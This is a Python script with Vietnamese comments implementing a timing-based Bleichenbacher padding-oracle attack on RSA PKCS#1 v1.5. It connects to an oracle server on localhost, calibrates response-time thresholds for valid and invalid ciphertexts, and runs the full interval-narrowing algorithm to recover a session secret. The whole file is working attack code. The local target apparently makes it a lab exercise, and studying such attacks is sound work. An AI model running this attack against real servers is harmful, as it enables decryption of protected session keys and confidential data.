#!/usr/bin/env python3
# attack.py
#
# Bleichenbacher + time oracle trên OpenSSL rsautl (server_oracle.py).
# - Kết nối tới oracle, nhận n, e, c0.
# - Calibrate time: valid (c0) vs invalid (c0 ^ 0xff).
# - query_oracle(c) = True nếu thời gian giống valid (chậm hơn threshold).
# - Chạy attack giống session_attack.py để recover session_secret.

import socket
import binascii
import time
import statistics
import sys


HOST = "127.0.0.1"
PORT = 9999

SAMPLES_CALIB = 15       # số mẫu mỗi loại khi calibrate
SAMPLES_PER_QUERY = 5    # số mẫu mỗi query oracle


class TimeBleichenbacherAttack:
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port
        self.socket = None
        self.n = None
        self.e = None
        self.k = None
        self.B = None
        self.c0 = None
        self.threshold = None

    # ========== KẾT NỐI & NHẬN N, E, C0 ==========

    def connect(self):
        print(f"[*] Connecting to oracle {self.host}:{self.port}")
        self.socket = socket.create_connection((self.host, self.port), timeout=10)

        def read_line():
            data = b""
            while not data.endswith(b"\n"):
                chunk = self.socket.recv(1)
                if not chunk:
                    break
                data += chunk
            return data.decode().strip()

        modulus_line = read_line()
        exponent_line = read_line()
        ciphertext_line = read_line()

        if not (modulus_line.startswith("MODULUS:") and
                exponent_line.startswith("EXPONENT:") and
                ciphertext_line.startswith("CIPHERTEXT:")):
            raise RuntimeError("Invalid hello from server")

        self.n = int(modulus_line.split(":", 1)[1], 16)
        self.e = int(exponent_line.split(":", 1)[1], 16)
        c0_hex = ciphertext_line.split(":", 1)[1]
        self.c0 = int(c0_hex, 16)

        self.k = (self.n.bit_length() + 7) // 8
        self.B = 2 ** (8 * (self.k - 2))

        print(f"[+] RSA {self.n.bit_length()} bits, k={self.k}")
        print(f"[+] c0 (first 16 hex): {c0_hex[:16]}")

    # ========== LOW-LEVEL: GỬI 1 CIPHERTEXT & ĐO THỜI GIAN ==========

    def _time_once(self, c_int):
        c_bytes = c_int.to_bytes(self.k, "big")
        c_hex = binascii.hexlify(c_bytes).decode()
        msg = (c_hex + "\n").encode()

        start = time.perf_counter()
        self.socket.sendall(msg)
        # đọc tới "OK\n"
        data = b""
        while not data.endswith(b"\n"):
            chunk = self.socket.recv(16)
            if not chunk:
                break
            data += chunk
        end = time.perf_counter()
        return end - start

    # ========== CALIBRATE ORACLE ==========

    def calibrate(self):
        print("[*] Calibrating time oracle...")

        # valid = c0
        valid_times = [self._time_once(self.c0) for _ in range(SAMPLES_CALIB)]

        # invalid = c0 ^ 0xff (rất khó trùng valid)
        bad_int = self.c0 ^ 0xFF
        invalid_times = [self._time_once(bad_int) for _ in range(SAMPLES_CALIB)]

        mv = statistics.median(valid_times)
        mi = statistics.median(invalid_times)
        self.threshold = (mv + mi) / 2.0

        print(f"    median_valid   = {mv:.6f}s")
        print(f"    median_invalid = {mi:.6f}s")
        print(f"[+] threshold      = {self.threshold:.6f}s")

    # ========== ORACLE (bool) DÙNG BLEICHENBACHER ==========

    def query_oracle(self, ciphertext_int):
        if self.threshold is None:
            raise RuntimeError("Oracle not calibrated")

        times = [self._time_once(ciphertext_int) for _ in range(SAMPLES_PER_QUERY)]
        med = statistics.median(times)
        # valid → chậm hơn → med > threshold
        return med > self.threshold

    # ========== CÁC HÀM BLEICHENBACHER (reused) ==========

    def ceil(self, a, b):
        return (a + b - 1) // b

    def floor(self, a, b):
        return a // b

    def step1_find_s0(self, c0):
        print(f"[*] Step 1: Finding initial s0")
        s = self.ceil(self.n, 3 * self.B)
        count = 0

        while True:
            c_prime = (c0 * pow(s, self.e, self.n)) % self.n
            if self.query_oracle(c_prime):
                print(f"[+] Found s0 = {s} after {count} queries")
                return s
            s += 1
            count += 1
            if count % 1000 == 0:
                print(f"    ... tried {count} values")

    def step2_narrow(self, c0, s, M):
        B2 = 2 * self.B
        B3 = 3 * self.B
        new_M = set()
        for (a, b) in M:
            r_min = self.ceil(a * s - B3 + 1, self.n)
            r_max = self.floor(b * s - B2, self.n)
            for r in range(r_min, r_max + 1):
                low = max(a, self.ceil(B2 + r * self.n, s))
                high = min(b, self.floor(B3 - 1 + r * self.n, s))
                if low <= high:
                    new_M.add((low, high))
        return new_M

    def step3_find_next_s(self, c0, M, s_prev):
        if len(M) > 1:
            s = s_prev + 1
            while True:
                c_prime = (c0 * pow(s, self.e, self.n)) % self.n
                if self.query_oracle(c_prime):
                    return s
                s += 1
        else:
            a, b = next(iter(M))
            r = self.ceil(2 * (b * s_prev - 2 * self.B), self.n)
            while True:
                s_low = self.ceil(2 * self.B + r * self.n, b)
                s_high = self.floor(3 * self.B + r * self.n, a)
                for s in range(s_low, s_high + 1):
                    c_prime = (c0 * pow(s, self.e, self.n)) % self.n
                    if self.query_oracle(c_prime):
                        return s
                r += 1

    def extract_plaintext_bytes(self, m_int):
        try:
            m_bytes = m_int.to_bytes(self.k, byteorder='big')
            if m_bytes[0:2] == b'\x00\x02':
                pos = m_bytes.find(b'\x00', 2)
                if pos != -1:
                    return m_bytes[pos + 1:]
            return None
        except Exception:
            return None

    def bleichenbacher_attack(self):
        if self.c0 is None:
            print("[-] No ciphertext to attack")
            return None

        c0 = self.c0
        B2 = 2 * self.B
        B3 = 3 * self.B
        M = {(B2, B3 - 1)}

        print(f"[*] Initial interval: [{B2}, {B3-1}]")

        # Step 1: tìm s0
        s = self.step1_find_s0(c0)

        # Step 2: thu hẹp với s0
        M = self.step2_narrow(c0, s, M)
        print(f"[*] After s0: {len(M)} intervals")

        iteration = 1
        max_iterations = 5000

        while iteration <= max_iterations:
            if len(M) == 0:
                print("[-] No intervals left! Oracle inconsistent?")
                return None

            if iteration % 100 == 0:
                print(f"  [Iteration {iteration}] Intervals: {len(M)}")

            s_prev = s
            s = self.step3_find_next_s(c0, M, s_prev)
            M_new = self.step2_narrow(c0, s, M)

            if len(M_new) == 1:
                a, b = next(iter(M_new))
                if a == b:
                    print(f"\n[+] Single point found: {a}")
                    recovered = self.extract_plaintext_bytes(a)
                    if recovered:
                        print(f"[+] Extracted session secret (hex): {recovered.hex()}")
                        return recovered

            M = M_new
            iteration += 1

        print("[-] Attack failed - max iterations reached")
        return None

    def close(self):
        if self.socket:
            self.socket.close()
            print("[+] Connection closed")


def main():
    atk = TimeBleichenbacherAttack()
    try:
        atk.connect()
        atk.calibrate()

        start = time.time()
        secret = atk.bleichenbacher_attack()
        end = time.time()

        if secret:
            print(f"\n[✓] SUCCESS – recovered session secret:")
            print(f"    {secret.hex()}")
            print(f"    Time: {end - start:.2f}s")
        else:
            print("\n[✗] FAILED – could not recover session secret")

    finally:
        atk.close()


if __name__ == "__main__":
    main()
